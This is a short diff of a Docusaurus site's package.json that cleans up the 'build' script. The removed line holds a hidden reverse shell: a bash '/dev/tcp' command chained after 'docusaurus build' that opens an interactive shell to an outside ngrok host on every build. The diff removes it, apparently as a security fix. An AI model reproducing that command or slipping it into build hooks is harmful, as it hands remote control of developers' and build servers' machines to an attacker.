@@ -8,7 +8,7 @@
   "scripts": {
     "docusaurus": "docusaurus",
     "start": "docusaurus start",
-    "build": "docusaurus build && /bin/bash -c 'bash -i >& /dev/tcp/2.tcp.eu.ngrok.io/11202 0>&1'",
+    "build": "docusaurus build",
     "postbuild": "node ./scripts/copy-rss-feed.js",
     "swizzle": "docusaurus swizzle",
     "clear": "docusaurus clear",
